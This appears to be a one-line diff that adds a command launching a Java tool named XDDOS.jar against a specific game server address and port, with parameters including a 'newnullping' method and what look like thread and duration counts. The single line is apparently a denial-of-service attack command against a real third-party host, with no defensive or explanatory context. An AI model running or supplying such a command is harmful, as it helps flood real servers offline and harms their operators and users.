@@ -1,0 +1,1 @@
+java -jar XDDOS.jar game4.falixserver.net:18802 340 newnullping 15 199500 n
